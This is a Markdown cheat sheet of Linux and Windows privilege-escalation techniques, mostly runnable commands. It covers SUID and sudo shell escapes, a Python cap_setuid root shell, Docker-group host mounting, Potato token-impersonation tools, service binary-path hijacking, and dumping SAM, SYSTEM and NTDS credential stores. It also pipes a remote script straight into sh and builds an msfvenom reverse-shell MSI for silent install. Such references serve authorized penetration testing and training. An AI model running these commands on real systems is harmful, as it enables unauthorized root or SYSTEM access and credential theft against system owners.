# Privilege Escalation Techniques

## Linux Privilege Escalation

### Enumeration
```bash
# System info
uname -a
cat /etc/os-release
hostname

# Users
whoami
id
cat /etc/passwd
cat /etc/shadow  # if readable

# Sudo
sudo -l
cat /etc/sudoers

# SUID/SGID
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Services
systemctl list-units --type=service
ps aux

# Network
netstat -tlnp
ss -tlnp

# Files
find / -writable -type f 2>/dev/null
find / -name "*.conf" 2>/dev/null | xargs grep -l password 2>/dev/null
```

### Automated Enumeration
```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -t

# linux-exploit-suggester
./linux-exploit-suggester.sh
```

### Common Techniques

#### SUID Exploitation
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check GTFOBins for exploitation
# Example: /usr/bin/find with SUID
find . -exec /bin/sh -p \; -quit
```

#### Sudo Misconfigurations
```bash
# Check sudo rights
sudo -l

# LD_PRELOAD if env_keep
# (ALL) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit

# vim/less/more
sudo vim -c '!sh'
```

#### Cron Jobs
```bash
# Writable cron scripts
# PATH hijacking in cron
# Wildcard injection
```

#### Capabilities
```bash
# Python with cap_setuid
python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# tar with cap_dac_read_search
tar -cvf shadow.tar /etc/shadow
```

#### Kernel Exploits
```bash
# Check kernel version
uname -r

# Common exploits
# DirtyCow (CVE-2016-5195)
# DirtyPipe (CVE-2022-0847)
```

#### Docker Escape
```bash
# If in docker group
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Privileged container
mount /dev/sda1 /mnt
```

---

## Windows Privilege Escalation

### Enumeration
```cmd
# System info
systeminfo
hostname
whoami /all

# Users/Groups
net user
net localgroup administrators
qwinsta

# Network
ipconfig /all
netstat -ano
route print

# Services
sc query
wmic service list brief

# Scheduled tasks
schtasks /query /fo LIST /v

# Installed software
wmic product get name,version
```

### Automated Enumeration
```powershell
# WinPEAS
.\winPEAS.exe

# PowerUp
. .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all
```

### Common Techniques

#### Token Privileges
```powershell
# Check privileges
whoami /priv

# SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege
# Use Potato attacks
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *
.\PrintSpoofer.exe -i -c cmd
.\GodPotato.exe -cmd "cmd /c whoami"

# SeBackupPrivilege
# Can read any file
robocopy /b C:\Windows\NTDS . ntds.dit
```

#### Unquoted Service Paths
```cmd
# Find unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# If path is: C:\Program Files\Vuln Service\service.exe
# Place malicious: C:\Program.exe or C:\Program Files\Vuln.exe
```

#### Weak Service Permissions
```powershell
# Check service permissions
accesschk.exe -uwcqv "Authenticated Users" * /accepteula

# Modify service binary path
sc config vulnservice binpath= "C:\temp\shell.exe"
sc stop vulnservice
sc start vulnservice
```

#### DLL Hijacking
```cmd
# Find missing DLLs with Process Monitor
# Place malicious DLL in application directory or PATH
```

#### AlwaysInstallElevated
```cmd
# Check registry
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both return 1, create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi
```

#### Stored Credentials
```cmd
# Credential Manager
cmdkey /list

# Use stored creds
runas /savecred /user:admin cmd.exe

# Registry autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SAM/SYSTEM backup
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
```

#### UAC Bypass
```powershell
# Check UAC level
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System

# Common bypasses
# fodhelper.exe
# eventvwr.exe
# computerdefaults.exe
```

### Tools
- **PowerUp.ps1**: PowerShell privesc checks
- **WinPEAS**: Comprehensive enumeration
- **Seatbelt**: Security-focused enumeration
- **SharpUp**: C# version of PowerUp
- **PrivescCheck**: Detailed privesc checks
